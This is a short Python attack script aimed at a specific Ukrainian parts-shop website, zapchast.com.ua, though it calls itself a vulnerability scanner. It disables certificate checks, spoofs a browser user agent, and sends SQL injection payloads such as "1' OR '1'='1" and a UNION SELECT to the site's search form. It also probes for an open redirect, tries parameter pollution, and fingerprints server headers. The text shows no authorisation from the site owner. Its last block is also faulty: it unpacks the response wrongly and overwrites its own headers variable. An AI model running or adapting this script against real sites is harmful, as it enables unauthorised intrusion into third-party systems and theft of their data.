#!/usr/bin/env python3
"""zapchast.com.ua vulnerability scanner"""
import urllib.request, urllib.error, urllib.parse
import ssl, json

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
base = "https://www.zapchast.com.ua"
headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"}

def get(path, params=None):
    url = base + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
            return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, str(e)

def post(path, data):
    req = urllib.request.Request(base + path, data=urllib.parse.urlencode(data).encode(), headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=5, context=ctx) as r:
            return r.getcode(), r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, str(e)

# 1. Form SQL injection
print("=== SQL Injection in POST params ===")
payloads = [
    {"partnum_id": "1' OR '1'='1", "cmd": "search", "valid_action": "1"},
    {"partnum_id": "1 UNION SELECT 1,2,3,4,5--", "cmd": "search", "valid_action": "1"},
    {"idx_PartMake": "1' OR 1=1--", "cmd": "search", "valid_action": "1"},
]

for p in payloads:
    code, body = post("/process.html", p)
    print(f"  POST code={code} len={len(body)} param={list(p.keys())[0]}")

# 2. Check redirect.php
print("\n=== Open redirect ===")
for param, val in [("url", "//example.com"), ("to", "//example.com"), ("r", "//example.com")]:
    code, body = get("/redirect.php", {param: val})
    if code != 200 and code != 404:
        print(f"  redirect.php?{param}= -> HTTP {code} LOCATION:{body[:100]}")

# 3. Parameter pollution
print("\n=== Parameter pollution ===")
params = [("idx_PartMake[]", "1"), ("idx_PartMake", "1,2,3")]
code, body = post("/process.html", params)
print(f"  Array param: {code} len={len(body)}")

print("\n=== Server details ===")
code, headers = urllib.request.urlopen(urllib.request.Request(base + "/", headers=headers), timeout=5, context=ctx)
print(f"  Server: {headers.headers.get('Server', 'unknown')}")
print(f"  X-Powered-By: {headers.headers.get('X-Powered-By', 'unknown')}")
